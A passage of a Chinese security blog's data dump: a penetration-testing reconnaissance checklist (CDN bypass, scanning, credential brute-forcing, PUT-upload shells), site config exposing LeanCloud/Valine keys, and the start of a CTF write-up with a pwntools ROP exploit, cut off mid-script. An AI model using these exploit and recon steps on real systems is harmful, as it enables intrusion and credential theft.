权威记录\n&emsp;&emsp;NS 服务器记录\n&emsp;&emsp;A IPv4地址记录\n&emsp;&emsp;MX 邮件交换记录\n&emsp;&emsp;PTR IP地址反解析\n&emsp;&emsp;AAAA IPv6地址记录\n&emsp;&emsp;CNAME 别名记录\n&emsp;&emsp;1.11.1 Kali-Dig\n&emsp;&emsp;1.11.2 Kali-dnsenum\n#### 1.12 综合信息收集\n&emsp;&emsp;1.12.1 Kali-theharvester(比如：-d baidu.com -l 100 -b bing)\n#### 1.13 资产信息收集\n&emsp;&emsp;1.13.1 钟馗之眼（在线）\n&emsp;&emsp;1.13.2 佛法查询（在线）\n#### 1.14 搜索引擎黑客\n&emsp;&emsp;1.14.1 百度黑客搜索语法\n&emsp;&emsp;1.14.2 谷歌黑客搜索语法\n#### 1.15 邮箱信息\n&emsp;&emsp;1.15.1 公开的邮箱地址\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：@XX.com\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;你可以看到命名规则，还能收集更多的信息\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;留着邮箱地址后期可以暴力破解\n&emsp;&emsp;1.15.2 邮箱地址泄露的密码\n&emsp;&emsp;1.15.3 邮箱地址泄露的其他信息\n#### 1.16 系统公开漏洞\n&emsp;&emsp;1.16.1 乌云镜像\n&emsp;&emsp;1.16.2 老漏洞复现\n&emsp;&emsp;1.16.3 老漏洞暴露的其他信息\n#### 1.17 WAF防火墙探测\n&emsp;&emsp;1.17.1 报错方式\n&emsp;&emsp;1.17.2 漏洞探测（如：敏感字符：% -- \" ' @ //等）\n&emsp;&emsp;1.17.3 公开漏洞\n&emsp;&emsp;1.17.4 扫描探测（如：Nmap）\n#### 1.18 其他信息收集\n&emsp;&emsp;1.18.1 火狐插件-Wappalyzer\n&emsp;&emsp;1.18.2 其他插件....\n&emsp;&emsp;1.18.3 APP手机软件破解或抓包\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;破解以后里面有注释信息和其他信息\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;抓包可以看到通讯IP地址，进行二次，三次信息收集和渗透\n\n\n","slug":"information-collection","published":1,"mouth":"01","updated":"2020-09-18T03:38:45.378Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxc000hez8k80sqcdrb","content":"<p><strong>对敌人不了解，怎么打败敌人</strong><br><a id=\"more\"></a></p>\n<h3 id=\"一、-信息收集：\"><a href=\"#一、-信息收集：\" class=\"headerlink\" title=\"一、 信息收集：\"></a>一、 信息收集：</h3><h4 id=\"1-1-真实IP地址\"><a href=\"#1-1-真实IP地址\" class=\"headerlink\" title=\"1.1 真实IP地址\"></a>1.1 真实IP地址</h4><p>&emsp;&emsp;<strong>如果IP地址不是真实的，测试会出现偏差(如：测试的端口服务全部都是假的)</strong><br>&emsp;&emsp;1.1.1 ping命令<br>&emsp;&emsp;1.1.2 IP138在线查询<br>&emsp;&emsp;1.1.3 CDN地址探测（隐藏真实IP地址）<br>&emsp;&emsp;&emsp;&emsp;如：xxx.cdn.XXX….IP地址（这个是CDN地址不是真实IP）<br>&emsp;&emsp;&emsp;&emsp;绕过CDN小窍门：XSS漏洞、DDOS、邮件订阅…等</p>\n<h4 id=\"1-2-端口服务探测\"><a href=\"#1-2-端口服务探测\" class=\"headerlink\" title=\"1.2 端口服务探测\"></a>1.2 端口服务探测</h4><p>&emsp;&emsp;<strong>用于暴力破解、系统架构判断</strong><br>&emsp;&emsp;1个域名可以解析多个IP地址的端口<br>&emsp;&emsp;1.2.1 Nmap探测<br>&emsp;&emsp;1.2.2 Zenmap探测</p>\n<h4 id=\"1-3-HTML前端敏感注释信息\"><a href=\"#1-3-HTML前端敏感注释信息\" class=\"headerlink\" title=\"1.3 HTML前端敏感注释信息\"></a>1.3 HTML前端敏感注释信息</h4><p>&emsp;&emsp;1.3.1 &lt;!–看注释信息,<strong>因为有的管理员会把测试账户密码写进去</strong>–&gt;<br>&emsp;&emsp;1.3.2 前端框架信息，如：Jquery框架<br>&emsp;&emsp;1.3.3 框架查看攻略<br>&emsp;&emsp;&emsp;&emsp;1.3.3.1 路径地址（扔百度里）<br>&emsp;&emsp;&emsp;&emsp;1.3.3.2 JS里面版权信息<br>&emsp;&emsp;1.3.4 框架信息扔百度里搜索公开漏洞<br>&emsp;&emsp;&emsp;&emsp;1.3.4.1 DOM XSS跨站脚本攻击漏洞<br>&emsp;&emsp;&emsp;&emsp;1.3.4.2 ….（其他未知漏洞）</p>\n<h4 id=\"1-4-whois信息收集\"><a href=\"#1-4-whois信息收集\" class=\"headerlink\" title=\"1.4 whois信息收集\"></a>1.4 whois信息收集</h4><p>&emsp;&emsp;1.4.1 在线收集，如：DNS地址/注册邮箱/时间…等<br>&emsp;&emsp;&emsp;&emsp;1.4.1.1 拿到邮箱地址可以百度查询公开的密码等信息<br>&emsp;&emsp;1.4.2 Kali-whois查询</p>\n<h4 id=\"1-5-中间件版本信息\"><a href=\"#1-5-中间件版本信息\" class=\"headerlink\" title=\"1.5 中间件版本信息\"></a>1.5 中间件版本信息</h4><p>&emsp;&emsp;1.5.1 系统报错的方式<br>&emsp;&emsp;1.5.2 抓包的方式（如：请求：OPTIONS）<br>&emsp;&emsp;&emsp;&emsp;1.5.2.1 如果OPTIONS以后开启了PUT方法，可以尝试上传漏洞GETSHELL<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;IIS6.0、Apache存在这个漏洞可能性较大<br>&emsp;&emsp;1.5.3 漏洞扫描器自带判断功能<br>&emsp;&emsp;1.5.4 端口服务探测方式自动探测</p>\n<h4 id=\"1-6-系统功能信息\"><a href=\"#1-6-系统功能信息\" class=\"headerlink\" title=\"1.6 系统功能信息\"></a>1.6 系统功能信息</h4><p>&emsp;&emsp;<strong>只要能交互的，全部都收集（包括功能地址）</strong><br>&emsp;&emsp;1.6.1 增删改查功能<br>&emsp;&emsp;1.6.2 文件上传功能<br>&emsp;&emsp;1.6.3 功能请求方式和参数</p>\n<h4 id=\"1-7-系统服务端编程语言\"><a href=\"#1-7-系统服务端编程语言\" class=\"headerlink\" title=\"1.7 系统服务端编程语言\"></a>1.7 系统服务端编程语言</h4><p>&emsp;&emsp;1.7.1 编程语言（JavaWeb、PHP…等）<br>&emsp;&emsp;&emsp;&emsp;  JSP（特征：HTML前端开头以及部分代码模块后面大量的换行）<br>&emsp;&emsp;1.7.2 编程框架（如：S2、THinkPHP…等以及相关目录和URL后缀）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：.action、.do</p>\n<h4 id=\"1-8-域名-子域名\"><a href=\"#1-8-域名-子域名\" class=\"headerlink\" title=\"1.8 域名/子域名\"></a>1.8 域名/子域名</h4><p>&emsp;&emsp;<strong>二级、三级、四级、五级…,通过域名来判断该系统的数量规模</strong><br>&emsp;&emsp;1.8.1 子域名挖掘机<br>&emsp;&emsp;1.8.2 其他工具（….）</p>\n<h4 id=\"1-9-目录-子目录\"><a href=\"#1-9-目录-子目录\" class=\"headerlink\" title=\"1.9 目录/子目录\"></a>1.9 目录/子目录</h4><p>&emsp;&emsp;<strong>二级、三级、四级、五级…</strong><br>&emsp;&emsp;1.9.1 御剑目录扫描器<br>&emsp;&emsp;1.9.2 Kali-Dirb目录探测<br>&emsp;&emsp;1.9.3 Kali-Dirbuster（/usr/share/dirbuster下）<br>&emsp;&emsp;1.9.4 BurpSuite爬虫</p>\n<h4 id=\"1-10-C段-旁注\"><a href=\"#1-10-C段-旁注\" class=\"headerlink\" title=\"1.10 C段/旁注\"></a>1.10 C段/旁注</h4><p>&emsp;&emsp;1.10.1 旁站在线查询<br>&emsp;&emsp;1.10.2 C段在线查询</p>\n<h4 id=\"1-11-DNS地址信息收集\"><a href=\"#1-11-DNS地址信息收集\" class=\"headerlink\" title=\"1.11 DNS地址信息收集\"></a>1.11 DNS地址信息收集</h4><p>&emsp;&emsp;SOA 权威记录<br>&emsp;&emsp;NS 服务器记录<br>&emsp;&emsp;A IPv4地址记录<br>&emsp;&emsp;MX 邮件交换记录<br>&emsp;&emsp;PTR IP地址反解析<br>&emsp;&emsp;AAAA IPv6地址记录<br>&emsp;&emsp;CNAME 别名记录<br>&emsp;&emsp;1.11.1 Kali-Dig<br>&emsp;&emsp;1.11.2 Kali-dnsenum</p>\n<h4 id=\"1-12-综合信息收集\"><a href=\"#1-12-综合信息收集\" class=\"headerlink\" title=\"1.12 综合信息收集\"></a>1.12 综合信息收集</h4><p>&emsp;&emsp;1.12.1 Kali-theharvester(比如：-d baidu.com -l 100 -b bing)</p>\n<h4 id=\"1-13-资产信息收集\"><a href=\"#1-13-资产信息收集\" class=\"headerlink\" title=\"1.13 资产信息收集\"></a>1.13 资产信息收集</h4><p>&emsp;&emsp;1.13.1 钟馗之眼（在线）<br>&emsp;&emsp;1.13.2 佛法查询（在线）</p>\n<h4 id=\"1-14-搜索引擎黑客\"><a href=\"#1-14-搜索引擎黑客\" class=\"headerlink\" title=\"1.14 搜索引擎黑客\"></a>1.14 搜索引擎黑客</h4><p>&emsp;&emsp;1.14.1 百度黑客搜索语法<br>&emsp;&emsp;1.14.2 谷歌黑客搜索语法</p>\n<h4 id=\"1-15-邮箱信息\"><a href=\"#1-15-邮箱信息\" class=\"headerlink\" title=\"1.15 邮箱信息\"></a>1.15 邮箱信息</h4><p>&emsp;&emsp;1.15.1 公开的邮箱地址<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：@XX.com<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;你可以看到命名规则，还能收集更多的信息<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;留着邮箱地址后期可以暴力破解<br>&emsp;&emsp;1.15.2 邮箱地址泄露的密码<br>&emsp;&emsp;1.15.3 邮箱地址泄露的其他信息</p>\n<h4 id=\"1-16-系统公开漏洞\"><a href=\"#1-16-系统公开漏洞\" class=\"headerlink\" title=\"1.16 系统公开漏洞\"></a>1.16 系统公开漏洞</h4><p>&emsp;&emsp;1.16.1 乌云镜像<br>&emsp;&emsp;1.16.2 老漏洞复现<br>&emsp;&emsp;1.16.3 老漏洞暴露的其他信息</p>\n<h4 id=\"1-17-WAF防火墙探测\"><a href=\"#1-17-WAF防火墙探测\" class=\"headerlink\" title=\"1.17 WAF防火墙探测\"></a>1.17 WAF防火墙探测</h4><p>&emsp;&emsp;1.17.1 报错方式<br>&emsp;&emsp;1.17.2 漏洞探测（如：敏感字符：% – “ ‘ @ //等）<br>&emsp;&emsp;1.17.3 公开漏洞<br>&emsp;&emsp;1.17.4 扫描探测（如：Nmap）</p>\n<h4 id=\"1-18-其他信息收集\"><a href=\"#1-18-其他信息收集\" class=\"headerlink\" title=\"1.18 其他信息收集\"></a>1.18 其他信息收集</h4><p>&emsp;&emsp;1.18.1 火狐插件-Wappalyzer<br>&emsp;&emsp;1.18.2 其他插件….<br>&emsp;&emsp;1.18.3 APP手机软件破解或抓包<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;破解以后里面有注释信息和其他信息<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;抓包可以看到通讯IP地址，进行二次，三次信息收集和渗透</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p><strong>对敌人不了解，怎么打败敌人</strong><br>","more":"</p>\n<h3 id=\"一、-信息收集：\"><a href=\"#一、-信息收集：\" class=\"headerlink\" title=\"一、 信息收集：\"></a>一、 信息收集：</h3><h4 id=\"1-1-真实IP地址\"><a href=\"#1-1-真实IP地址\" class=\"headerlink\" title=\"1.1 真实IP地址\"></a>1.1 真实IP地址</h4><p>&emsp;&emsp;<strong>如果IP地址不是真实的，测试会出现偏差(如：测试的端口服务全部都是假的)</strong><br>&emsp;&emsp;1.1.1 ping命令<br>&emsp;&emsp;1.1.2 IP138在线查询<br>&emsp;&emsp;1.1.3 CDN地址探测（隐藏真实IP地址）<br>&emsp;&emsp;&emsp;&emsp;如：xxx.cdn.XXX….IP地址（这个是CDN地址不是真实IP）<br>&emsp;&emsp;&emsp;&emsp;绕过CDN小窍门：XSS漏洞、DDOS、邮件订阅…等</p>\n<h4 id=\"1-2-端口服务探测\"><a href=\"#1-2-端口服务探测\" class=\"headerlink\" title=\"1.2 端口服务探测\"></a>1.2 端口服务探测</h4><p>&emsp;&emsp;<strong>用于暴力破解、系统架构判断</strong><br>&emsp;&emsp;1个域名可以解析多个IP地址的端口<br>&emsp;&emsp;1.2.1 Nmap探测<br>&emsp;&emsp;1.2.2 Zenmap探测</p>\n<h4 id=\"1-3-HTML前端敏感注释信息\"><a href=\"#1-3-HTML前端敏感注释信息\" class=\"headerlink\" title=\"1.3 HTML前端敏感注释信息\"></a>1.3 HTML前端敏感注释信息</h4><p>&emsp;&emsp;1.3.1 &lt;!–看注释信息,<strong>因为有的管理员会把测试账户密码写进去</strong>–&gt;<br>&emsp;&emsp;1.3.2 前端框架信息，如：Jquery框架<br>&emsp;&emsp;1.3.3 框架查看攻略<br>&emsp;&emsp;&emsp;&emsp;1.3.3.1 路径地址（扔百度里）<br>&emsp;&emsp;&emsp;&emsp;1.3.3.2 JS里面版权信息<br>&emsp;&emsp;1.3.4 框架信息扔百度里搜索公开漏洞<br>&emsp;&emsp;&emsp;&emsp;1.3.4.1 DOM XSS跨站脚本攻击漏洞<br>&emsp;&emsp;&emsp;&emsp;1.3.4.2 ….（其他未知漏洞）</p>\n<h4 id=\"1-4-whois信息收集\"><a href=\"#1-4-whois信息收集\" class=\"headerlink\" title=\"1.4 whois信息收集\"></a>1.4 whois信息收集</h4><p>&emsp;&emsp;1.4.1 在线收集，如：DNS地址/注册邮箱/时间…等<br>&emsp;&emsp;&emsp;&emsp;1.4.1.1 拿到邮箱地址可以百度查询公开的密码等信息<br>&emsp;&emsp;1.4.2 Kali-whois查询</p>\n<h4 id=\"1-5-中间件版本信息\"><a href=\"#1-5-中间件版本信息\" class=\"headerlink\" title=\"1.5 中间件版本信息\"></a>1.5 中间件版本信息</h4><p>&emsp;&emsp;1.5.1 系统报错的方式<br>&emsp;&emsp;1.5.2 抓包的方式（如：请求：OPTIONS）<br>&emsp;&emsp;&emsp;&emsp;1.5.2.1 如果OPTIONS以后开启了PUT方法，可以尝试上传漏洞GETSHELL<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;IIS6.0、Apache存在这个漏洞可能性较大<br>&emsp;&emsp;1.5.3 漏洞扫描器自带判断功能<br>&emsp;&emsp;1.5.4 端口服务探测方式自动探测</p>\n<h4 id=\"1-6-系统功能信息\"><a href=\"#1-6-系统功能信息\" class=\"headerlink\" title=\"1.6 系统功能信息\"></a>1.6 系统功能信息</h4><p>&emsp;&emsp;<strong>只要能交互的，全部都收集（包括功能地址）</strong><br>&emsp;&emsp;1.6.1 增删改查功能<br>&emsp;&emsp;1.6.2 文件上传功能<br>&emsp;&emsp;1.6.3 功能请求方式和参数</p>\n<h4 id=\"1-7-系统服务端编程语言\"><a href=\"#1-7-系统服务端编程语言\" class=\"headerlink\" title=\"1.7 系统服务端编程语言\"></a>1.7 系统服务端编程语言</h4><p>&emsp;&emsp;1.7.1 编程语言（JavaWeb、PHP…等）<br>&emsp;&emsp;&emsp;&emsp;  JSP（特征：HTML前端开头以及部分代码模块后面大量的换行）<br>&emsp;&emsp;1.7.2 编程框架（如：S2、THinkPHP…等以及相关目录和URL后缀）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：.action、.do</p>\n<h4 id=\"1-8-域名-子域名\"><a href=\"#1-8-域名-子域名\" class=\"headerlink\" title=\"1.8 域名/子域名\"></a>1.8 域名/子域名</h4><p>&emsp;&emsp;<strong>二级、三级、四级、五级…,通过域名来判断该系统的数量规模</strong><br>&emsp;&emsp;1.8.1 子域名挖掘机<br>&emsp;&emsp;1.8.2 其他工具（….）</p>\n<h4 id=\"1-9-目录-子目录\"><a href=\"#1-9-目录-子目录\" class=\"headerlink\" title=\"1.9 目录/子目录\"></a>1.9 目录/子目录</h4><p>&emsp;&emsp;<strong>二级、三级、四级、五级…</strong><br>&emsp;&emsp;1.9.1 御剑目录扫描器<br>&emsp;&emsp;1.9.2 Kali-Dirb目录探测<br>&emsp;&emsp;1.9.3 Kali-Dirbuster（/usr/share/dirbuster下）<br>&emsp;&emsp;1.9.4 BurpSuite爬虫</p>\n<h4 id=\"1-10-C段-旁注\"><a href=\"#1-10-C段-旁注\" class=\"headerlink\" title=\"1.10 C段/旁注\"></a>1.10 C段/旁注</h4><p>&emsp;&emsp;1.10.1 旁站在线查询<br>&emsp;&emsp;1.10.2 C段在线查询</p>\n<h4 id=\"1-11-DNS地址信息收集\"><a href=\"#1-11-DNS地址信息收集\" class=\"headerlink\" title=\"1.11 DNS地址信息收集\"></a>1.11 DNS地址信息收集</h4><p>&emsp;&emsp;SOA 权威记录<br>&emsp;&emsp;NS 服务器记录<br>&emsp;&emsp;A IPv4地址记录<br>&emsp;&emsp;MX 邮件交换记录<br>&emsp;&emsp;PTR IP地址反解析<br>&emsp;&emsp;AAAA IPv6地址记录<br>&emsp;&emsp;CNAME 别名记录<br>&emsp;&emsp;1.11.1 Kali-Dig<br>&emsp;&emsp;1.11.2 Kali-dnsenum</p>\n<h4 id=\"1-12-综合信息收集\"><a href=\"#1-12-综合信息收集\" class=\"headerlink\" title=\"1.12 综合信息收集\"></a>1.12 综合信息收集</h4><p>&emsp;&emsp;1.12.1 Kali-theharvester(比如：-d baidu.com -l 100 -b bing)</p>\n<h4 id=\"1-13-资产信息收集\"><a href=\"#1-13-资产信息收集\" class=\"headerlink\" title=\"1.13 资产信息收集\"></a>1.13 资产信息收集</h4><p>&emsp;&emsp;1.13.1 钟馗之眼（在线）<br>&emsp;&emsp;1.13.2 佛法查询（在线）</p>\n<h4 id=\"1-14-搜索引擎黑客\"><a href=\"#1-14-搜索引擎黑客\" class=\"headerlink\" title=\"1.14 搜索引擎黑客\"></a>1.14 搜索引擎黑客</h4><p>&emsp;&emsp;1.14.1 百度黑客搜索语法<br>&emsp;&emsp;1.14.2 谷歌黑客搜索语法</p>\n<h4 id=\"1-15-邮箱信息\"><a href=\"#1-15-邮箱信息\" class=\"headerlink\" title=\"1.15 邮箱信息\"></a>1.15 邮箱信息</h4><p>&emsp;&emsp;1.15.1 公开的邮箱地址<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：@XX.com<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;你可以看到命名规则，还能收集更多的信息<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;留着邮箱地址后期可以暴力破解<br>&emsp;&emsp;1.15.2 邮箱地址泄露的密码<br>&emsp;&emsp;1.15.3 邮箱地址泄露的其他信息</p>\n<h4 id=\"1-16-系统公开漏洞\"><a href=\"#1-16-系统公开漏洞\" class=\"headerlink\" title=\"1.16 系统公开漏洞\"></a>1.16 系统公开漏洞</h4><p>&emsp;&emsp;1.16.1 乌云镜像<br>&emsp;&emsp;1.16.2 老漏洞复现<br>&emsp;&emsp;1.16.3 老漏洞暴露的其他信息</p>\n<h4 id=\"1-17-WAF防火墙探测\"><a href=\"#1-17-WAF防火墙探测\" class=\"headerlink\" title=\"1.17 WAF防火墙探测\"></a>1.17 WAF防火墙探测</h4><p>&emsp;&emsp;1.17.1 报错方式<br>&emsp;&emsp;1.17.2 漏洞探测（如：敏感字符：% – “ ‘ @ //等）<br>&emsp;&emsp;1.17.3 公开漏洞<br>&emsp;&emsp;1.17.4 扫描探测（如：Nmap）</p>\n<h4 id=\"1-18-其他信息收集\"><a href=\"#1-18-其他信息收集\" class=\"headerlink\" title=\"1.18 其他信息收集\"></a>1.18 其他信息收集</h4><p>&emsp;&emsp;1.18.1 火狐插件-Wappalyzer<br>&emsp;&emsp;1.18.2 其他插件….<br>&emsp;&emsp;1.18.3 APP手机软件破解或抓包<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;破解以后里面有注释信息和其他信息<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;抓包可以看到通讯IP地址，进行二次，三次信息收集和渗透</p>"},{"title":"PCB鹏城杯CTFwriteup&复现","index_img":"/img/2018-12-03/index.png","date":"2018-12-03T04:33:23.000Z","_content":"**大大大佬的博客->[传送门](https://delcoding.github.io/2018/12/pcb-writeup/)**\n\n<!--more-->\n### PWN\n#### 0x00 overInt\n思路：有两个key的检测，过了之后有一个循环以下内容\n```\n*(&v8 + v6) = v5;\nv3 = (int *)(unsigned int)v5;\nprintf(\"str_pos is %c\\n\", v3);\n```\n这里直接将输入的值写到一个地址的偏移，就有一个任意地址写的洞，然后通过这个进行常规的rop\nexp如下\n```\nfrom pwn import *\nfrom struct import pack\ncontext(os='linux',arch='amd64',aslr = 'False')\nlocal = 0\nlog_level='debug'\n\nif local:\n\tp = process(\"./overInt\")#,env={'LD_PRELOAD':'./libc_x64.so.6'})\n\telf = ELF(\"./overInt\")\n\t#libc = ELF('./libc_x64.so.6')\nelse:\n\tp = remote('58.20.46.148',35272)\n\telf = ELF(\"./overInt\")\n\t#libc = ELF('./libc_x64.so.6')\n\ndef change_addr(num,string):\n\tj = 0\n\tfor i in range(8):\n\t\tp.recvuntil(\"Which position you want to modify?\\n\")\n\t\tpayload = p32(num)\n\t\tp.send(payload)\n\t\tp.recvuntil(\"What content you want to write in?\\n\")\n\t\tpayload = string[j]\n\t\tp.send(payload)\n\t\tnum += 1\n\t\tj += 1\n\t\t\npop_rdi = 0x0000000000400b13\nread_got = elf.got[\"read\"] # 0x602038\nalarm_got = elf.got[\"alarm\"] # 0x602030\nstart = 0x4005D0\nputs_plt = elf.plt[\"puts\"] # 0x40054c\n\n#gdb.attach(p,\"b *0x400AAC\")\n\np.recvuntil(\"Please set arrary number:\")\np.send(\"over\")\np.recvuntil(\"How many numbers do you have?\\n\")\np.send(p32(10))\nfor i in range(9):\n\tdata = p.recv()\n\tp.send(p32(0))\np.recv() \np.send(p32(0x20633372))\n\np.recvuntil(\"How many positions you want to modify?\\n\")\np.send(p32(32))\n\nstring = \"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\" #pop_rdi\nchange_addr(0x38,string)\nstring = \"\\x38\\x20\\x60\\x00\\x00\\x00\\x00\\x00\" #read_got\nchange_addr(0x40,string)\nstring = \"\\x4c\\x05\\x40\\x00\\x00\\x00\\x00\\x00\" #puts_plt\nchange_addr(0x48,string)\nstring = \"\\xd0\\x05\\x40\\x00\\x00\\x00\\x00\\x00\" #start\nchange_addr(0x50,string)\np.recvuntil(\"!\")\ndata = p.recvuntil(\"\\n\",drop=True)\ndata = data.ljust(8,\"\\x00\")\ndata = u64(data)\nlibc_base = data - 0x0f7250\nprint \"base : \"+hex(libc_base)\nbinsh_addr = libc_base + 0x18cd57\nsystem_addr 